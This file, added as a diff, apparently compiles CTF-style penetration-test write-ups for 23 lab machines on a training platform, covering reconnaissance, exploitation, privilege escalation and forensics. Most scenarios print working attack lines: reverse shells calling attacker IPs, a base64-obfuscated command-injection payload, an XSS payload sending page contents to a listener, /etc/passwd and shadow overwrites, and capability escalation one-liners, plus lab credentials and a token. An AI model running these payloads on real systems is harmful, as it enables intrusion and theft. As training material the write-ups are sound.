@@ -1,0 +1,702 @@
+Compilation of your world scenario write-ups
+
+### Scenario 1: Vsftpd Backdoor Exploitation (Anchorfiles.hv)
+#### Executive Summary
+This scenario involved exploiting a known backdoor in vsftpd 2.3.4 to gain root access on a target system. The objective was to uncover financial intelligence (IBAN), the attacker's IP, and stolen database credentials through forensic analysis and data recovery.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap scan revealed open ports: 21 (FTP - vsftpd 2.3.4), 22 (SSH), 80 (HTTP - Apache).
+   - Gobuster directory scan: /index.html (200), /server-status (403).
+
+2. **Exploitation**:
+   - Exploited vsftpd backdoor using Metasploit (msfconsole) by triggering with a username containing ":)".
+   - Gained root shell.
+
+3. **Financial Intelligence**:
+   - Explored web root and system files to find IBAN for illegal data sales.
+
+4. **Forensic Investigation**:
+   - Found .git folder in /home/test/vsftpd-2.3.4-infected/ pointing to a public GitHub repo (false lead).
+   - Checked /var/log for logs: Timestamped entry (2024-08-01) showing nexcorp.sql handled by IP 198.51.100.5.
+
+5. **Data Recovery**:
+   - Used `find` to locate nexcorp.sql.
+   - Inspected SQL INSERT statements to recover admin password.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Metasploit.
+- CVE/Exploits: Vsftpd 2.3.4 backdoor.
+- Commands: `cat config` (Git config), log analysis.
+
+#### Lessons Learned
+Exposed services like outdated FTP servers are high-risk entry points. Regular log reviews and secure configurations can prevent data exfiltration.
+
+---
+
+### Scenario 2: Werkzeug Debugger Exploitation (Aurora.hv)
+#### Executive Summary
+Exploited an exposed Werkzeug Debugger console to gain initial access, followed by privilege escalation via Linux capabilities on Vim, leading to root access and extraction of GPS coordinates from an image's EXIF metadata.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: Ports 22 (SSH), 80 (HTTP - Nginx).
+   - Gobuster: /console (200).
+
+2. **Initial Access**:
+   - Identified Werkzeug Debugger with PIN protection but found SECRET key in source: "lCDwNVxx9m46pIJlYvkt".
+   - Executed reverse shell payload: `import os; os.popen('bash -c "bash -i >& /dev/tcp/10.8.17.211/4444 0>&1"').read()`.
+   - Upgraded shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+
+3. **Privilege Escalation**:
+   - Enumerated capabilities: `/sbin/getcap -r / 2>/dev/null` showed /usr/local/bin/vim with cap_setuid=ep.
+   - Exploited: `/usr/local/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`.
+
+4. **Digital Forensics**:
+   - Accessed /root directory as root.
+   - Extracted EXIF metadata from scammer's image: GPS 48° 51' 38.00" N, 2° 21' 9.00" E.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Python for shell upgrade.
+- Vulnerabilities: Exposed debugger, capability abuse.
+
+#### Lessons Learned
+Misconfigured debug tools and capabilities can lead to full system compromise. Disable debug modes in production.
+
+---
+
+### Scenario 3: BlackBot Botnet Takedown (Blackbot.hv)
+#### Executive Summary
+Compromised a botnet server via unauthenticated Redis, session manipulation, blind command injection, and kernel exploit (DirtyPipe) to escalate to root, identifying the developer and admin email.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: Ports 22 (SSH), 80 (HTTP - Nginx), 6379 (Redis).
+   - Gobuster: /forgot-password, /login, /logout, /register.
+
+2. **Initial Access via Redis**:
+   - Connected: `redis-cli -h 172.20.12.122`.
+   - Attempted cron job reverse shell but blocked; identified session cookies.
+   - Manipulated session: `SET ... "{\"userID\":\"...\",\"isAdmin\":true,\"isPremium\":true}"`.
+
+3. **Web Privilege Escalation**:
+   - Unlocked /attack panel.
+
+4. **RCE**:
+   - Blind command injection in panel; bypassed filters with ${IFS} and Base64-encoded shell.
+   - Payload: `127.0.0.1$(echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTIuMTk1LzQ0NDQgMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)`.
+
+5. **Internal Enumeration**:
+   - Found developer handle @conjurer in main.go.
+   - Located admin email in /internal/storage/database.db.
+
+6. **Root Escalation**:
+   - Vulnerable kernel; exploited CVE-2022-0847 (DirtyPipe).
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Redis-CLI.
+- CVEs: CVE-2022-0847.
+- Commands: Redis manipulation, Base64 shell.
+
+#### Lessons Learned
+Unauthenticated databases like Redis are critical risks. Use firewalls and authentication.
+
+---
+
+### Scenario 4: Froxlor RCE and Escalation (Brinkhosting.hv)
+#### Executive Summary
+Gained access to a hosting panel via default credentials after bypassing lockout, exploited Froxlor RCE (CVE-2023-0315), and escalated using SUID on xxd to read/modify sensitive files.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: Multiple ports (SSH, SMTP, HTTP, POP3, IMAP, MySQL).
+   - Gobuster: /webadmin, /doc, /tests, etc.
+
+2. **Gaining Access**:
+   - Confirmed admin user via lockout messages.
+   - Bypassed session lock with Burp Suite; default creds: admin:admin.
+
+3. **Exploitation**:
+   - CVE-2023-0315: Manipulated log path to .php/.twig for SSTI.
+   - Used Metasploit: froxlor_log_path_rce for reverse shell.
+   - Upgraded: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+
+4. **Privilege Escalation**:
+   - SUID on /usr/bin/xxd.
+   - Read /root/root.txt: `xxd "/root/root.txt" | xxd -r`.
+   - Modified /etc/passwd: `echo 'root::0:0:root:/root:/bin/bash' | xxd | xxd -r - /etc/passwd`.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Burp Suite, Metasploit.
+- CVEs: CVE-2023-0315.
+
+#### Lessons Learned
+Default credentials and exposed panels amplify risks. Secure file permissions prevent escalation.
+
+---
+
+### Scenario 5: Phishing Portal XSS Exfiltration (Officemailcentral.hv)
+#### Executive Summary
+Shifted from server-side attacks to client-side XSS on a phishing admin panel, exfiltrating stolen emails including the target from Hegmann Holdings.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: Ports 22 (SSH), 80 (HTTP), 3306 (MySQL).
+   - Gobuster: /assets, /database, /index.php, /phpinfo.php, /webadmin.
+
+2. **Why Initial XSS Failed**:
+   - Simple <script> tags stripped; GET limits; CORS/CSP blocks; listeners missed POST body.
+
+3. **Successful Payload**:
+   - SVG bypass: `<svg/onload="fetch('http://IP:8080',{method:'POST',body:document.body.innerText})">`.
+   - Custom Python listener captured full logs, revealing charyl.stallan@hegmannholdings.com.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Custom Python listener.
+- Techniques: Stored XSS, SVG onload evasion.
+
+#### Lessons Learned
+Client-side attacks succeed where server-side fails. Use modern APIs like fetch for reliable exfiltration.
+
+---
+
+### Scenario 6: Malware and TFTP Upload (Orionspace.hv)
+#### Executive Summary
+Analyzed phishing malware leading to C2 discovery, used TFTP for shell upload, and escalated by overwriting /etc/shadow due to mispermissions.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap TCP: 22 (SSH), 80 (HTTP - Nginx).
+   - Nmap UDP: 69 (TFTP).
+
+2. **Malware Analysis**:
+   - Deobfuscated .bat: PowerShell reverse shell to 56.78.146.89.
+
+3. **Exploitation**:
+   - TFTP put: Uploaded p0wny shell.php.
+   - Triggered for reverse shell.
+
+4. **Privilege Escalation**:
+   - /etc/shadow writable; generated hash: `openssl passwd -1 -salt xyz password123`.
+   - Overwrote: `cat /etc/shadow | sed ... > /tmp/shadow_new && cat /tmp/shadow_new > /etc/shadow`.
+
+#### Tools and Techniques
+- Tools: Nmap (UDP), TFTP client.
+- Techniques: File upload via TFTP, shadow file manipulation.
+
+#### Lessons Learned
+Exposed UDP services like TFTP enable pivots. File permissions must be strictly enforced.
+
+---
+
+### Scenario 7: Chemystore SQLi and Capability Abuse (Chemystore.hv)
+#### Executive Summary
+Leaked credentials via SQLi, uploaded shell via dashboard, overcame shell instability with nohup, and escalated using gdb capabilities to access restricted files.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP), 3306 (MySQL).
+   - Gobuster: /adminpanel, /images, /uploads.
+
+2. **Exploitation**:
+   - SQLi leaked admin: T9829A6P5r, root: ND676yDZrx.
+   - Uploaded GIF89a; PHP shell via dashboard.
+   - Stable shell: nohup with Chankro.
+
+3. **Privilege Escalation**:
+   - gdb cap_setuid=ep: `gdb -nx -ex 'python import os; os.setuid(0); os.system("/bin/bash")'`.
+
+4. **Data Extraction**:
+   - Read /root .xlsx and .txt as root.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, MySQL CLI.
+- Techniques: SQLi, shell stabilization with nohup.
+
+#### Lessons Learned
+Database creds in code lead to pivots. Capabilities on debug tools are dangerous.
+
+---
+
+### Scenario 8: Pastezone SSTI and PHP Capability (Pastezone.hv)
+#### Executive Summary
+Exploited Twig SSTI for RCE, escalated using PHP capabilities, and exfiltrated GitHub credentials and phone number via regex search.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Gobuster: /assets, /create.php, /index.php, /vendor.
+
+2. **Vulnerability Identification**:
+   - Tested SSTI: {{7*7}} rendered 49.
+
+3. **Exploitation**:
+   - RCE: {{ ['id'] | map('system') | join }}.
+   - Reverse shell.
+
+4. **Privilege Escalation**:
+   - /usr/bin/php8.4 cap_setuid+ep: `/usr/bin/php8.4 -r "posix_setuid(0); system('cat /root/github.txt');"`.
+
+5. **Exfiltration**:
+   - GitHub creds; phone via `grep -r "+1[0-9]{10}" /`.
+
+#### Tools and Techniques
+- Techniques: SSTI in Twig, capability abuse.
+
+#### Lessons Learned
+Template engines need sanitization. Regex aids forensics.
+
+---
+
+### Scenario 9: Leakphase Docker API Compromise (Leakphase.hv)
+#### Executive Summary
+Exploited unauthenticated Docker API to exec commands in containers, counting leaked credentials (82,157) and finding query IP (177.78.109.190) and developer (BoothCharlie).
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP), 2375 (Docker).
+   - Gobuster: /about, /contact, /static.
+
+2. **Exploitation**:
+   - Curl API: Listed containers, mounts.
+   - Exec: `curl -X POST ... /exec` for `ls`, `wc -l`, `grep`.
+
+3. **Data Extraction**:
+   - Total records: 82,157.
+   - IP for test@test: 177.78.109.190.
+   - Git config: BoothCharlie, PAT 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.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Curl for Docker API.
+
+#### Lessons Learned
+Secure Docker APIs with auth. Mounts expose host data.
+
+---
+
+### Scenario 10: Foxxo9 Blog Git and phpMyAdmin RCE (Foxxo9-blog.hv)
+#### Executive Summary
+Dumped exposed .git repo for creds, accessed phpMyAdmin, exploited CVE-2018-12613 for RCE, revealing true identity: Dexter Grayson.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 80 (HTTP), 3306 (MySQL).
+   - Gobuster: /index.php, /phpMyAdmin.
+
+2. **Git Leak**:
+   - Dumped .git: DB creds root:f3f8-450d-8b25.
+
+3. **Database Access**:
+   - Logged into phpMyAdmin 4.8.1.
+
+4. **RCE**:
+   - CVE-2018-12613: Session poisoning with `SELECT '<?php system("whoami"); ?>'`.
+   - LFI to trigger: index.php?target=.../sess_[ID].
+   - Reverse shell.
+
+5. **Identity**:
+   - /etc/passwd: foxxo9 = Dexter Grayson.
+
+#### Tools and Techniques
+- Tools: Git-dumper, phpMyAdmin.
+- CVEs: CVE-2018-12613.
+
+#### Lessons Learned
+Exposed Git and old software enable chains.
+
+---
+
+### Scenario 11: Salemmanor Node.js Debugger (Salemmanor.hv)
+#### Executive Summary
+Accessed Node.js Inspector for debug shell, spawned reverse shell, investigated manuscripts for "curse" (modern tech terms), and found disappearance timestamp from /mnt recordings.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP - Node.js), 3000 (Inspector).
+   - Gobuster: /about, /archive, /blog.
+
+2. **Initial Access**:
+   - `node inspect`: Confirmed target env.
+   - Reverse shell: `require('child_process').exec('nc -e sh 172.20.18.197 4444')`.
+
+3. **Investigation**:
+   - discovery.txt: 333-year-old box with grimoire.
+   - "Curse": Prototype Pollution, etc.
+
+4. **Forensics**:
+   - /mnt recordings: ISO timestamp of event.
+
+#### Tools and Techniques
+- Tools: Node inspect.
+- Techniques: Debug shell RCE.
+
+#### Lessons Learned
+Exposed inspectors are direct paths to code exec.
+
+---
+
+### Scenario 12: Melodyhackerteam WebDAV Shell (Melodyhackerteam.hv)
+#### Executive Summary
+Accessed WebDAV, uploaded shell from backup, escalated with SUID nice, identified first target domain from files.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP).
+   - Gobuster: /webdav (403).
+   - Curl OPTIONS: Confirmed PUT enabled.
+
+2. **Enumeration**:
+   - Cadaver: Found melody_index.zip, web_shell_backup.zip.
+
+3. **Exploitation**:
+   - Uploaded p0wny-shell; triggered for RCE.
+
+4. **Escalation**:
+   - SUID /usr/bin/nice: `nice /bin/sh -p`.
+
+5. **Intel**:
+   - Target domain from notes.
+
+#### Tools and Techniques
+- Tools: Cadaver, Curl.
+- Techniques: WebDAV upload.
+
+#### Lessons Learned
+Insecure WebDAV methods enable uploads.
+
+---
+
+### Scenario 13: SentryNode PyYAML Deserialization (Sentrynode.hv)
+#### Executive Summary
+Leaked PIN via API, uploaded malicious YAML for RCE, escalated with SUID Python.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (Gunicorn).
+   - Gobuster: /login, /robots.txt, /api/status (PyYAML 5.4.1).
+
+2. **Initial Access**:
+   - /api/forgot-password leaked PIN 827364.
+
+3. **Exploitation**:
+   - YAML deserialization: !!python/object/apply:os.system for reverse shell.
+
+4. **Escalation**:
+   - SUID Python: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.
+
+#### Tools and Techniques
+- Vulnerabilities: PyYAML deserialization.
+
+#### Lessons Learned
+Version mismatches signal vulns. Secure uploads.
+
+---
+
+### Scenario 14: Solarflare Log Poisoning (Reports.solarflare.hv)
+#### Executive Summary
+Extracted session from Memcached, poisoned logs for RCE, found DB creds, dumped user hash.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 80 (HTTP), 3306 (MySQL), 11211 (Memcached).
+   - Gobuster: /assets, /logs.php.
+
+2. **Initial Access**:
+   - Memcached dump: Session key for dc1cfc1e-... (Bella Leach).
+
+3. **Exploitation**:
+   - User-Agent poison: PHP system() for mkfifo reverse shell.
+
+4. **Post-Exploitation**:
+   - DB creds: root:h5DYbX8sCRd4.
+   - Dumped Bella's hash.
+
+#### Tools and Techniques
+- Tools: Metasploit memcached_extractor.
+- Techniques: Log poisoning.
+
+#### Lessons Learned
+Exposed caches enable hijacks. Sanitize logs.
+
+---
+
+### Scenario 15: Sunsethackteam CuteNews Exploit (Sunsethackteam.hv)
+#### Executive Summary
+Logged into CuteNews with defaults, exploited CVE-2019-11447 for shell upload, escalated with SUID cp to modify /etc/passwd.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP).
+   - Gobuster: /controlpanel, /uploads.
+
+2. **Access**:
+   - Admin:admin.
+
+3. **Exploitation**:
+   - CVE-2019-11447: Python script uploaded GIF89a; PHP shell.
+
+4. **Escalation**:
+   - SUID cp: Copied modified /etc/passwd with new root user.
+
+#### Tools and Techniques
+- CVEs: CVE-2019-11447.
+- Tools: Exploit script.
+
+#### Lessons Learned
+CMS defaults are common. SUID on utils dangerous.
+
+---
+
+### Scenario 16: Vectorvilla SPIP RCE (Vectorvilla.hv)
+#### Executive Summary
+Exploited SPIP with Metasploit, injected commands in sudo script for root shell, accessed DB for villa data.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP), 3306 (MySQL).
+   - Gobuster: /spip, /assets.
+
+2. **Exploitation**:
+   - Metasploit multi/http/spip_rce_form.
+
+3. **Escalation**:
+   - /opt/files/villa_search.sh sudo injectable: `-c "nc -e /bin/bash ..."`.
+
+4. **DB Access**:
+   - Creds root:root; queried tables.
+
+#### Tools and Techniques
+- Tools: Metasploit.
+- CVEs: CVE-2023-27372.
+
+#### Lessons Learned
+Sudo scripts need sanitization. CMS forms risky.
+
+---
+
+### Scenario 17: Axiom VNC and Firefox Creds (Axiom.hv)
+#### Executive Summary
+Accessed unauthenticated VNC, escalated with SUID Python, decrypted Firefox logins.json for clipclock.hv password.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 5901 (VNC - no auth).
+
+2. **Initial Access**:
+   - VNC connection as dale.
+
+3. **Escalation**:
+   - SUID Python: `/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.
+
+4. **Credential Recovery**:
+   - Exfiltrated logins.json, key4.db.
+   - Decryption script revealed password.
+
+#### Tools and Techniques
+- Tools: Nmap (VNC scripts).
+- Techniques: Firefox decryption.
+
+#### Lessons Learned
+Unauth VNC exposes desktops. Encrypt browser creds.
+
+---
+
+Below is a well-organized compilation of the additional Hackviser scenarios from the provided "pt2.txt" document. I've extracted and structured each one (there are 7 distinct scenarios based on unique targets, summaries, and raw data). Each has:
+
+- **Title**: Descriptive name based on the target or key elements.
+- **Executive Summary**: Concise overview.
+- **Key Phases and Steps**: Detailed breakdown.
+- **Tools and Techniques**: Key tools, CVEs, methods.
+- **Lessons Learned**: Insights.
+
+These continue from the previous 17, making a total of 24 if combined. Copy this into a text file (e.g., "hackviser_writeups_pt2.txt") for your portfolio.
+
+---
+
+### Scenario 18: Textpattern CMS NFS Leak and Escalation (Netguard.hv)
+#### Executive Summary
+Exploited NFS share to leak DB credentials from Textpattern CMS config, updated admin hash for access, uploaded web shell via dashboard, and overwrote a cron script for root escalation.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: Ports 21 (FTP), 22 (SSH), 80 (HTTP - Apache), 111 (RPC), 2049 (NFS), 3306 (MySQL).
+   - Gobuster: /images, /files, /themes, /css.php, Textpattern CMS 4.8.7 identified.
+   - Showmount: NFS share /var/nfs/general.
+
+2. **Initial Access**:
+   - Mounted NFS: Found config.php with DB creds (dbuser:x2bjCxmDwdLqwbDV).
+   - MySQL login, described txp_users table.
+   - Updated pass hash for textpattern user to known value.
+
+3. **RCE**:
+   - Logged into admin dashboard.
+   - Uploaded Powny shell to /files; triggered reverse shell.
+
+4. **Privilege Escalation**:
+   - Upgraded shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+   - Found world-writable /status_report_config.sh (root cron).
+   - Overwrote with reverse shell: `echo "bash -i >& /dev/tcp/172.20.8.136/4447 0>&1" > /status_report_config.sh`.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Showmount, MySQL CLI.
+- Techniques: NFS mount leak, hash update, file upload RCE, cron overwrite.
+
+#### Lessons Learned
+Exposed NFS shares leak configs. Restrict file permissions on cron scripts.
+
+---
+
+### Scenario 19: Foxxo9 Blog Git and phpMyAdmin Exploit (Foxxo9-blog.hv)
+#### Executive Summary
+Dumped exposed .git repo for source code and DB creds, accessed phpMyAdmin 4.8.1, exploited CVE-2018-12613 for RCE, and revealed true identity from /etc/passwd.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 80 (HTTP - Apache), 3306 (MySQL); UDP 68 (DHCP).
+   - Gobuster: /index.php, /phpMyAdmin, /git (exposed).
+
+2. **Information Leak**:
+   - Git-dumper: Extracted source, DB creds (root:f3f8-450d-8b25).
+
+3. **Database Access**:
+   - Logged into phpMyAdmin; updated admin hash.
+
+4. **Exploitation**:
+   - CVE-2018-12613: Session poisoning with `SELECT '<?php system("bash -c \"bash -i >& /dev/tcp/172.20.15.76/4444 0>&1\""); ?>'`.
+   - Triggered LFI: index.php?target=.../sess_[ID] for reverse shell.
+   - Upgraded: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+
+5. **Identity Revelation**:
+   - `cat /etc/passwd`: foxxo9 = Dexter Grayson.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Git-dumper.
+- CVEs: CVE-2018-12613 (phpMyAdmin LFI/RCE).
+
+#### Lessons Learned
+Exposed Git repos leak everything. Update vulnerable tools like phpMyAdmin.
+
+---
+
+### Scenario 20: Reservia Hotel Reservation Pivot (Reservia.hv)
+#### Executive Summary
+Leaked hotel data via MongoDB, injected JS for reverse shell, used XXE for file exfil (creds and code), pivoted to MySQL for true room number of target "Crow" (Jefferson Tippin).
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap: 22 (SSH), 80 (HTTP - Nginx), 27017 (MongoDB).
+   - Gobuster: /about, /blog, /hotels, /css.
+   - Mongosh: Found reservia DB, hotel_reservations with target email, internal API at 172.20.3.117.
+
+2. **Initial Access**:
+   - JS injection in createdDate: `createdDate=---js\n{os:require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.3.204 4444 >/tmp/f')}\n---` for mkfifo reverse shell.
+
+3. **XXE Exploitation**:
+   - POST to /reservation_listener.php with XXE: Leaked reservation_listener.php, database/connect.php (MySQL creds root:NscNN36PGp3ZVaHEUxmuLh6D).
+   - Other reads: /room.txt, /var/log/apache2/access.log, /home/nova/.ssh/authorized_keys.
+
+4. **Database Pivot**:
+   - MySQL connect: Queried hotel.reservations for Tippin's real room (starts with 8), bypassing API randomization.
+
+#### Tools and Techniques
+- Tools: Nmap, Gobuster, Mongosh, Curl for XXE.
+- Techniques: NoSQL injection, XXE file read, DB pivot.
+
+#### Lessons Learned
+Unauth DBs and XML parsers enable chains. Sanitize inputs and use internal firewalls.
+
+---
+
+### Scenario 21: Luna Stealer XXE and Host Escape (Data Dome)
+#### Executive Summary
+Exploited XXE in XML parser for file reads, analyzed stealer logs by date, used PHP capabilities for root in container, escaped to host via mounts, found victims list, SMTP creds, and dev phone.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Gobuster: /api (200), /data (405).
+   - XML parser reflects IPAddress; saves to /host/home/logs/[ID].
+
+2. **XXE Exploitation**:
+   - Payload: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` in IPAddress; leaked /etc/passwd (luna user), /etc/mtab (mounts), code from index.php (Luna Stealer, Telegram link).
+
+3. **Log Analysis**:
+   - XXE read logs: Found directories by timestamp, emails/passwords (e.g., alice@secure-hub.hv:securepass123).
+   - Sorted: `find . -type d -readable -printf "%T@ %Tc %p\n" | sort -n`.
+
+4. **Privilege Escalation**:
+   - Capabilities: /usr/bin/php5 cap_setuid+ep.
+   - `php5 -r 'posix_setuid(0); system("/bin/bash -i");'` for root in container.
+
+5. **Host Escape and Intel**:
+   - Mounts: Accessed /host/home/logs, /host/root.
+   - Added SSH key for host root access.
+   - Victims: /root/email/victims.txt (first: mark.tanner@quantumsolutions.hv).
+   - SMTP: /root/email/.env (securityteamhelp984@gmail.com:GUV2vd6an2p3x7).
+   - Dev: /root/stealer_app/README.md (Bob Eliason, +1-(555)-462-1524).
+
+#### Tools and Techniques
+- Tools: Gobuster, Find, Getcap.
+- Techniques: XXE, container escape via mounts, capability abuse.
+
+#### Lessons Learned
+XXE in parsers leaks systems. Secure containers with no unnecessary mounts/capabilities.
+
+---
+
+### Scenario 22: SNMP Credential Leak and Systemctl Esc (Alexriveraexplorer.hv)
+#### Executive Summary
+Leaked SSH creds via SNMP extend MIB, accessed as explorer, exploited sudo on systemctl to set SUID on bash for root.
+
+#### Key Phases and Steps
+1. **Reconnaissance**:
+   - Nmap UDP: 161 (SNMP).
+   - Nmap TCP: 22 (SSH), 80 (HTTP - Apache).
+   - Gobuster: /images, /css, /js.
+
+2. **Information Leak**:
+   - Snmpwalk public: NET-SNMP-EXTEND-MIB leaked creds (explorer:gnw2vejVkbatTM).
+
+3. **Initial Access**:
+   - SSH as explorer.
+
+4. **Privilege Escalation**:
+   - Sudo -l: NOPASSWD on /bin/systemctl.
+   - Created /tmp/root.service: ExecStart sets SUID on /bin/bash.
+   - `sudo /bin/systemctl enable /tmp/root.service --now`.
+   - `/bin/bash -p` for root.
+
+#### Tools and Techniques
+- Tools: Nmap, Snmpwalk.
+- Techniques: SNMP enumeration, GTFOBins systemctl.
+
+#### Lessons Learned
+Default SNMP communities leak data. Limit sudo to safe commands.
+
+---
+
+### Scenario 23: File Upload Vulnerability Forensics
+#### Executive Summary
+Analyzed Apache logs to identify attacker IP (10.0.0.41), Gobuster recon, broken file upload in upload.php for shell, POST command exec, and zip exfil of wp-config.php.
+
+#### Key Phases and Steps
+1. **Log Analysis**:
+   - /var/log/apache2/access.log: Suspicious traffic from 10.0.0.41.
+
+2. **Recon Discovery**:
+   - Gobuster patterns: 404s leading to /uploads/.
+
+3. **Exploit**:
+   - upload.php: No extension validation; uploaded shell.php.
+
+4. **Post-Exploitation**:
+   - POST to shell.php?feature=shell for command exec.
+
+5. **Exfiltration**:
+   - Bash script zipped wp-config.php for download.
+
+#### Tools and Techniques
+- Techniques: Log forensics, file upload vuln.
+
+#### Lessons Learned
+Validate uploads strictly. Monitor logs for brute-force patterns.
+
+---
